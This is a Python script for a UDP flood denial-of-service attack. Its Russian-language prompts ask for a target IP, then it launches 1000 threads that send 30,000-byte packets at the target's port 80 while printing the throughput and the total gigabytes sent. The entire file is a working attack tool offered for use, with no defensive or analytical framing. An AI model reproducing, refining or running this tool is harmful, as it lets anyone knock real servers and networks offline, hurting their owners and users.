from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
from getpass import getpass as hinput

class Brutalize:

    def __init__(self, ip, port=80, force=30000, threads=1000):
        self.ip = ip
        self.port = port
        self.force = force  # default: 30000
        self.threads = threads  # default: 1000

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' ' * 20}", end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    print()

    ip = input("Введите IP для атаки -> ")
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.', ''))
    except:
        print("Ошибка! Пожалуйста, введите корректный IP адрес.")
        return

    # Default parameters
    port = 80
    force = 30000
    threads = 1000

    print()
    print(f"Начинаю атаку на {ip}. Порт: {port}")
    
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("Произошла фатальная ошибка, атака остановлена.")
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"Атака остановлена. {ip} был атакован, всего отправлено {round(brute.total, 1)} Gb.")
    print('\n')
    sleep(1)

    hinput("Нажмите enter для выхода.")

if __name__ == '__main__':
    main()
